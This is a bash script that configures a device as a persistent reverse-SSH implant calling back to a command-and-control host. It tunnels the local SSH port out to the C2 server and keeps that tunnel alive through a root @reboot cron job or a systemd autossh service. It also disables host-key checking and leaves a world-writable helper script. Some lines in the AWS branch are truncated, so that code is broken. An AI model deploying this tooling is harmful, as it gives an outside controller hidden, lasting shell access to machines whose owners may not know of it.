#!/bin/bash

################################################################
#                                                              #
# Let's setup an automated reverse ssh device!                 #
#                                                              #
# Once complete, the device will automatically attempt a       #
# connection when the device reboots                           #
#                                                              #
# xoxo Hexadecim8 did this w/PR from:                          #
#        https://github.com/Lijantropiquexoxo                  #
#                                                              #
################################################################

set -e

bold=$(tput bold)
normal=$(tput sgr0)
AWS=0
AUTOSSH=0

USAGE="
A bash script to automate reverse reverse ssh tunnels. Handy for callbacks
through NAT.
girltalk.sh:
  -a	Use AWS C2 infrastructure.
  -s    Use autossh method (more stable)
  -k    SSH key (full path).
  -c    C2 host.
  -u	C2 username.
  -l    Local username to use.
  -h	Help text and usage example.
usage:	 girltalk.sh -c <C2 hostname/IP> -l <local_username> -u <C2_username>
example: girltalk.sh -c host.aws.com -u ubuntu -l hatchetface -a -k ~/.ssh/amazon.keypair.pem
"


# Check if any flags were set. If not, print out help.
if [ $# -eq 0 ]; then
	echo "$USAGE"
	exit
fi


# Set flags.
while getopts "ashk:c:u:l:" FLAG
do
	case $FLAG in
		a)
			AWS=1
			;;
        s)
            AUTOSSH=1
            ;;
		k)
			KEY="$OPTARG"
			;;
		c)
			HOST=$OPTARG
			;;
		u)
			USERC2=$OPTARG
			;;
		l)
			USERLOCAL=$OPTARG
			;;
		h)	echo "$USAGE"
			exit
			;;
		*)
			echo "$USAGE"
			exit
			;;
	esac
done


# Make sure each required flag was actually set.
if [ -z ${USERC2+x} ]; then
	echo "Remote username (-u) is not set."
	echo "$USAGE"
	exit
elif [ -z ${USERLOCAL+x} ]; then
	echo "Local username (-l) is not set."
	echo "$USAGE"
	exit
elif [ -z ${HOST+x} ]; then
	echo "Remote C2 hostname (-c) is not set."
	echo "$USAGE"
	exit
elif [ -f ${KEY+x} ]; then
	echo "Remote C2 ssh key (-k) was not provided."
	echo "$USAGE"
	exit
fi


# Check for connectivity
echo "${bold}### Checking For Internet ###"
if ping -q -c 1 -W 1 1.1.1.1 >/dev/null; then
    echo "${bold}### IPv4 is up! ###"
    printf "\n"


# Installing deps - ssh
if (systemctl -q is-active sshd.service)
then
    echo "${bold}### SSH is Installed And Running! ###"
    printf "\n"
else
    echo "${bold}### Installing SSH Dependencies ###"
    sudo apt update && sudo apt upgrade
    sudo apt install openssh-server
    printf "\n"
    echo "${bold}### Starting SSH Service & Enabling On Reboot ###"
    sudo systemctl start ssh && sudo systemctl enable ssh
fi
    printf "\n"


# Generate local key
    echo "${bold}### Generating 4096 keypair ###"
    ssh-keygen -b 4096
    printf "\n"


# Error checking for user input
    until id "$USERLOCAL" >/dev/null; do
        echo "Please enter your local username";
    printf "\n"
    exit
done

########################################################
# AWS infrastructure selection                         #
# Falls over to default "off" if -a is not selected.   #
#                                                      #
########################################################

if [ ${AWS} -eq 1 ]; then


# Transferring local key to C2. Using scp to transfer key as there is no option to transfer w/key with scp-copy-id.
    echo "${bold}### Copying key to C2 host ###"
    scp -i ${KEY} /home/${USERLOCAL}/.ssh/id_rsa.pub ${USERC2}@${HOST}:/home/${USERC2}/.ssh/
    printf "\n"


# Generating an ssh key on your C2
    ssh $HOST 'ssh-keygen'


# Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches$
    echo "${bold}### Creating & transferring remote connection script ###"
    echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERLOCAL/hm$
    sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh
    scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
    printf "\n"


# Setup local cron job + cleanup
    echo "${bold}### Setting up local cronjob ###"
    echo "@reboot sleep 100 && sudo ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
    sudo crontab cronsh
    rm cronsh
    printf "\n"

# Finishing script
    echo "${bold}### Donezo! Please reboot the machine. ###"
    exit

########################################################
# Autossh selection                                    #
########################################################

elif [ ${AUTOSSH} -eq 1 ]; then

# Installing deps - autossh
if (systemctl -q is-active autossh.service)
then
    echo "${bold}### AutoSSH is Installed And Running! ###"
    printf "\n"
else
    echo "${bold}### Installing AutoSSH Dependencies ###"
    sudo apt update && sudo apt upgrade
    sudo apt install autossh
    printf "\n"
    # echo "${bold}### Starting AutoSSH Service & Enabling On Reboot ###"
    # sudo systemctl start autossh && sudo systemctl enable autossh
fi
    printf "\n"


# Verify if user 'autossh' exists
if id "autossh" &>/dev/null; then
    echo "${bold}### User 'autossh' found ###"
    # sed -i "s/home\/autossh:\/bin\/bash/var\/run\/autossh:\/bin\/false/g" /etc/passwd
else
    echo "${bold}### Creating user 'autossh'###"
    useradd autossh -s /bin/false -b /var/run
fi


# create tmp folder for configuration
if [ ! -d "/var/run/autossh" ]; then
    mkdir /var/run/autossh
else
    rm -rf /var/run/autossh/* /var/run/autossh/.[a-zA-Z0-9]*
fi
mkdir /var/run/autossh/.ssh
touch /var/run/autossh/.ssh/known_hosts
chown -R autossh:autossh /var/run/autossh


# create tunnel folder for persistence
if [ ! -d "/etc/tunnel" ]; then
    mkdir /etc/tunnel
else
    rm -rf /etc/tunnel/* /etc/tunnel/.[a-zA-Z0-9]*
fi
chown autossh:autossh /etc/tunnel
chmod 700 /etc/tunnel


# Generate ssh key in localhost
### Test this block
echo "${bold}### Creating new SSH key: /var/run/autossh/.ssh/id_rsa! ###"
ssh-keygen -t rsa -b 4096 -f /var/run/autossh/.ssh/id_rsa
cat /var/run/autossh/.ssh/id_rsa.pub | ssh -i ${KEY} ${USERC2}@${HOST} 'cat >> ~/.ssh/authorized_keys'
printf "\n"

# Copy ssh key ti tunnel folder and verify ownership
chown -R autossh:autossh /var/run/autossh
cp -Rp /var/run/autossh/.ssh /etc/tunnel
chmod -R 700 /etc/tunnel
chgrp -R autossh /etc/tunnel/.ssh


# Create Autossh configuration files
echo "${bold}### Creating autossh configuration files ###"
cat > /etc/default/autossh <<____HERE
##############################################
#Specifies how long ssh must be up before we
#consider it a successful connection
AUTOSSH_GATETIME=0
#Sets the connection monitoring port.
#A value of 0 turns the monitoring function off.
AUTOSSH_PORT=0
AUTOSSH_LOGLEVEL=7
AUTOSSH_LOGFILE=/var/run/autossh/user_ssh_error.out
SSH_OPTIONS="-N -o 'ServerAliveInterval 60' -o 'ServerAliveCountMax 3' -o 'StrictHostKeyChecking=no' -p 22 -R 20028:localhost:22 ${USERC2}@${HOST} -i  /etc/tunnel/.ssh/id_rsa"
###########################################
____HERE

cat > /lib/systemd/system/autossh.service <<HEREDOC

# This is the systemd file that will be added
#############################################
[Unit]
Description=autossh
Wants=network-online.target
After=network-online.target

[Service]
#Type=simple
User=autossh
EnvironmentFile=/etc/default/autossh
ExecStart=/usr/bin/autossh \$SSH_OPTIONS
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
#################################################
HEREDOC

ln -sf /lib/systemd/system/autossh.service /etc/systemd/system/autossh.service

cat > /usr/lib/tmpfiles.d/autossh.conf << HEREDOC
#########################################
d /var/run/autossh 0700 autossh autossh
L /var/run/autossh/.ssh - - - - /etc/tunnel/.ssh
##############################################
HEREDOC


# Complete configuration
systemctl daemon-reload
systemctl enable autossh
systemctl start autossh


####################################################################
#								   #
# If not usuing Autossh or AWS, script falls to this part of code! #
#								   #
####################################################################


else
# Transferring local key to C2
    echo "${bold}### Copying key to C2 host ###"
    ssh-copy-id $HOST
    printf "\n"


# Generating an ssh key on your C2
    ssh $HOST 'ssh-keygen'


# Creating hmu.sh, which should be run on the C2 host. This file transfers the C2 key back to the host and attaches to the SSH session.
    echo "${bold}### Creating & transferring remote connection script ###"
    echo "ssh-copy-id ${USERLOCAL}@localhost -p 43022 && ssh ${USERLOCAL}@localhost -p 43022" > /home/$USERLOCAL/hmu_$USERLOCAL.sh
    sudo chmod 777 /home/$USERLOCAL/hmu_$USERLOCAL.sh 
    scp /home/$USERLOCAL/hmu_$USERLOCAL.sh $HOST:/root
    printf "\n"


# Setup local cron job + cleanup
    echo "${bold}### Setting up local cronjob ###"
    echo "@reboot sleep 100 && sudo ssh -f -N -R 43022:localhost:22 ${HOST}" >> cronsh
    sudo crontab cronsh
    rm cronsh
    printf "\n"
    exit
fi

# Finishing script
    echo "${bold}### Donezo! Please reboot the machine. ###"

else
    echo "${bold}### Please check your network connection. ###"

fi
